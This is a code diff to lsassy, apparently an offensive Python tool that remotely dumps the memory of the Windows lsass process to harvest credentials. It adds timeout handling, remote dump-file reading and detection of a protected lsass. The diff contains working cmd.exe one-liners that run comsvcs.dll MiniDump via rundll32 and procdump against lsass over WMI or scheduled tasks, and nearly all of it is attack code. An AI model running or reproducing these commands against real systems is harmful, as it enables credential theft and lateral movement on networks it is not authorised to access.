@@ -2,6 +2,7 @@ import os
 import random
 import string
 
+from lsassy.impacketfile import ImpacketFile
 from lsassy.wmi import WMI
 from lsassy.taskexe import TASK_EXEC
 
@@ -14,11 +15,14 @@ class Dumper:
         self._procdump = "procdump.exe"
         self._procdump_path = args.procdump
         self._method = args.method
+        self._timeout = args.timeout
 
         if args.dumpname:
             self._remote_lsass_dump = args.dumpname
+            if "." not in self._remote_lsass_dump:
+                self._remote_lsass_dump += ".dmp"
         else:
-            self._remote_lsass_dump = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
+            self._remote_lsass_dump = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".dmp"
         self._conn = connection
         if args.procdump is not None:
             self._procdump_path = args.procdump
@@ -71,10 +75,10 @@ class Dumper:
             self._log.error("Method \"{}\" is not supported (0-4). See -h for help".format(self._method))
             return False
 
-        dumped = False
+        ifile = ImpacketFile(self._conn, self._log)
         for dump_methodology in dump_methodologies:
             dump_method, exec_shell, exec_methods = dump_methodology
-            self._log.debug("Trying {} method".format(dump_method))
+            self._log.debug("Trying \"{}\" method".format(dump_method))
             if dump_method == "dll":
                 dumped = self.dll_dump(exec_methods, exec_shell)
             elif dump_method == "procdump":
@@ -82,21 +86,28 @@ class Dumper:
             else:
                 self._log.error("Incorrect dump method \"{}\". Currently supported : procdump, dll".format(dump_method))
                 continue
+
             if dumped:
-                break
-
-        if not dumped:
-            return False
-
-        return (self._share + self._tmp_dir + self._remote_lsass_dump).replace("\\", "/")
+                """
+                If procdump failed, a dumpfile was created, and its content is "FAILED"
+                Best guess is that lsass is protected in some way (PPL, AV, ...)
+                """
+                try:
+                    ifile.open(
+                        (self._share + self._tmp_dir + self._remote_lsass_dump).replace("\\", "/"),
+                        timeout=self._timeout
+                    )
+                    if ifile.size() < 100 and ifile.read(6).decode('utf-8') == "FAILED":
+                        self._log.error("lsass is protected")
+                        ifile.close()
+                        return False
+                    ifile.seek(0)
+                    return ifile
+                except Exception as e:
+                    self._log.error("No dump file found. Target could be slow (Try to increase --timeout)")
+                    self._log.debug("Error : {}".format(str(e)))
 
     def dll_dump(self, exec_methods=("wmi", "task"), exec_shell="cmd"):
-        try:
-            self._conn.deleteFile(self._share, self._tmp_dir + self._remote_lsass_dump)
-            self._log.debug("Old lsass dump was removed")
-        except:
-            pass
-
         if exec_shell == "cmd":
             command = """cmd.exe /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ^%B {}{} full""".format(
                 self._tmp_dir, self._remote_lsass_dump
@@ -144,10 +155,13 @@ class Dumper:
         self.procdump = True
 
         # Dump lsass using PID
-        command = """cmd.exe /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma ^%B {}{}""".format(
-            self._tmp_dir, self._procdump, self._tmp_dir, self._remote_lsass_dump
+        command = """cmd.exe /Q /c for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -t -ma %J {}{} & if NOT EXIST {}{} (echo FAILED > {}{})""".format(
+            self._tmp_dir, self._procdump,
+            self._tmp_dir, self._remote_lsass_dump,
+            self._tmp_dir, self._remote_lsass_dump,
+            self._tmp_dir, self._remote_lsass_dump
         )
-        self._log.debug('Dumping lsass.exe')
+        self._log.debug("Command : {}".format(command))
 
         exec_completed = False
         while not exec_completed:
